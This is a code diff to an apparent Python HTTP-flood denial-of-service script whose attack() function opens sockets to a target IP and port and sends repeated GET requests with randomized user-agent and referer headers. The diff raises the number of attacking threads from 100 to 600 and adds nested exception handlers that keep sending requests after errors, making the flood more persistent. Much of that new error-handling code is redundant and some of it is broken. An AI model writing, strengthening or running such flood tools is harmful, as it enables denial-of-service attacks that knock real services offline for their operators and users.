@@ -82,7 +82,7 @@ def getuseragent():
 		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def rqheader():
-    connection = "Connection: keep-alive\r\n"
+    connection = "Connection: Keep-Alive\r\n"
     accept = Choice(acceptall)
     referer = "Referer: "+ "https://" + ip + "\r\n"
     useragent = "User-Agent: " + getuseragent() + "\r\n"
@@ -94,27 +94,57 @@ def attack():
     header = rqheader()
     go.wait()
     while True:
-        get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
-        request = get_host + header
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
-        num_sent = num_sent + 1
-        print("[+] Sent ", num_sent, " => ", ip , ":", port)
-        if port == 443:
-            x = ssl.wrap_socket(s)
-            try:
-                for i in range (100):
-                    x.send(str.encode(request))
-            except:
-                x.close()
+        try:
+            get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+            request = get_host + header
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            num_sent = num_sent + 1
+            print("[+] Sent ", num_sent, " => ", ip , ":", port)
+            if port == 443:
+                x = ssl.wrap_socket(s)
                 try:
                     for i in range (100):
                         x.send(str.encode(request))
                 except:
-                    x.close()
+                    for i in range (100):
+                        x.send(str.encode(request))
+                    try:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                    except:
+                        for i in range (100):
+                            x.send(str.encode(request))
+        except:
+            for i in range (300):
+                x.send(str.encode(request))
+            try:
+                get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+                request = get_host + header
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, port))
+                num_sent = num_sent + 1
+                print("[+] Sent ", num_sent, " => ", ip , ":", port)
+                if port == 443:
+                    x = ssl.wrap_socket(s)
+                    try:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                    except:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                        try:
+                            for i in range (100):
+                                x.send(str.encode(request))
+                        except:
+                            for i in range (100):
+                                x.send(str.encode(request))
+            except:
+                for i in range (100):
+                    x.send(str.encode(request))
 
 def build_thread():
-	for _ in range(100):
+	for _ in range(600):
 		bth = threading.Thread(target=attack)
 		bth.start()
 
